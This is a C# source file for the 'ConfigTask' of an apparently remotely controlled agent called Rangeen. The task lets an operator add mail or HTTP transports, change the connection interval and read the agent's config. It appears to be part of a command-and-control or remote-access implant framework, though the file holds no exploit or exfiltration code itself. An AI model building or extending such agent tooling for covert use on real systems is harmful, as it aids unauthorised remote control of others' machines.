using System;
using Rangeen.Transport;
using UtilsLib;

namespace Rangeen.BuiltInTasks
{
    /// <summary>
    /// This task change Agent's config.
    /// 
    /// Allowed commands:
    /// * AddTransport
    /// * ChangeInterval
    /// * 
    /// * 
    /// * 
    /// * 
    /// 
    /// Arguments:
    /// 0) Parameter to change
    /// 1...) Values
    /// </summary>
    public class ConfigTask
    {
        private Action<byte[], object> _resultAcceptor;

        public void Execute(string[] args, Action<byte[], object> resultAcceptor, object taskInfo)
        {
            _resultAcceptor = resultAcceptor;

            Console.WriteLine("[ConfigTask] runned. Args Len: {0}", args.Length);
            for (int i = 0; i < args.Length; i++)
            {
                Console.WriteLine("\t[ConfigTask] Arg #{0}: {1}", i, args[i]);
            }

            bool result = false;
            string output = null;

            try
            {
                switch (args[0])
                {
                    case "AddTransport":
                        result = AddTransport(args);
                        break;
                    case "ChangeInterval":
                        result = ChangeInterval(args);
                        break;
                    case "GetConfig":
                        output = Program.Config.ToJsonString();
                        break;
                    default:
                        output = "BadCommand";
                        break;
                }
            }
            catch (Exception e)
            {
                output = "Exception: " + e.Message + "\nStackTrace: " + e.StackTrace;
            }


            if (output == null)
                output = result ? "Succeeded" : "Fail";

            Console.WriteLine("[ConfigTask] {0}", output);
            _resultAcceptor.Invoke(output.GetBytes(), taskInfo);
        }

        /// <summary>
        /// Add new transport to transports list
        /// Format:
        /// 1) Transport type
        /// 2...) Transport args
        /// </summary>
        public bool AddTransport(string[] args)
        {
            ITransport transport;
            var transportArgs = new string[args.Length - 2];
            for (int i = 2; i < args.Length; i++)
                transportArgs[i - 2] = args[i];

            switch (args[1])
            {
                case "MailTransport":
                    transport = new MailTransport(transportArgs);
                    break;
                case "HttpTransport":
                    transport = new HttpTransport(transportArgs);
                    break;
                default:
                    return false;
            }
            Program.TransportManager.AddTransport(transport);

            return true;
        }

        /// <summary>
        /// Change connections interval
        /// Format:
        /// 1) Interval value
        /// </summary>
        public bool ChangeInterval(string[] args)
        {
            int interval;
            bool flag = int.TryParse(args[1], out interval);
            if (!flag)
                return false;

            Program.Config.Interval = interval;
            return true;
        }
    }
}